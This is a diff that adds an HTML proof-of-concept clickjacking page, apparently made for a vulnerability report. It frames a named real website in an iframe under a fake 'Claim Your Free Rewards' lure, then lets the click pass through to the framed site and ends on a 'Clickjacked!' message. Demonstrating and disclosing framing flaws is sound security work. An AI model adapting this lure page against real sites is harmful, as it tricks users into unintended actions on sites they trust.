@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Clickjacking PoC</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+    }
+    .container {
+      position: relative;
+      width: 100%;
+      height: 100%;
+    }
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+      opacity: 0.85;
+      pointer-events: none;
+    }
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 2;
+    }
+    .message-box {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 550px;
+      height: 350px;
+      padding: 30px;
+      background-color: #fff;
+      border: 2px solid #ccc;
+      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+      z-index: 10;
+      text-align: center;
+      display: block;
+    }
+    .message-box h2 {
+      font-size: 32px;
+      margin-top: 20px;
+      margin-bottom: 30px;
+    }
+    .message-box button {
+      padding: 15px 30px;
+      font-size: 20px;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+    }
+    .fake-action {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 20px 40px;
+      font-size: 30px;
+      background-color: #28a745;
+      color: #fff;
+      cursor: pointer;
+      z-index: 11;
+      display: none;
+    }
+    .clickjacked-message {
+      position: absolute;
+      top: 55%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #fff;
+      padding: 30px;
+      font-size: 26px;
+      color: #d9534f;
+      z-index: 12;
+      display: none;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+    }
+  </style>
+  <script>
+    function triggerClickjacking() {
+      document.querySelector('.message-box').style.display = 'none';
+      document.querySelector('.fake-action').style.display = 'block';
+      document.querySelector('iframe').style.pointerEvents = 'auto';
+
+      setTimeout(() => {
+        showClickjackedMessage();
+      }, 1000);
+    }
+
+    function showClickjackedMessage() {
+      document.querySelector('.fake-action').style.display = 'none';
+      document.querySelector('.clickjacked-message').style.display = 'block';
+    }
+  </script>
+</head>
+<body>
+  <div class="container">
+    <iframe src="https://demo-in.getrushapp.com/blog/"></iframe>
+    <div class="overlay">
+      <div class="message-box">
+        <h2>Claim Your Free Rewards</h2>
+        <button onclick="triggerClickjacking()">Proceed</button>
+	<h2>Hurry Now !!! </h2>
+	<h2>GetRushApp Exclusive</h2>
+      </div>
+      <div class="fake-action" onclick="showClickjackedMessage()">Perform Malicious Action</div>
+      <div class="clickjacked-message">
+        <strong>Clickjacked!</strong><br>
+        You have been clickjacked by Rivek Raj Tamang.
+      </div>
+    </div>
+  </div>
+</body>
+</html>
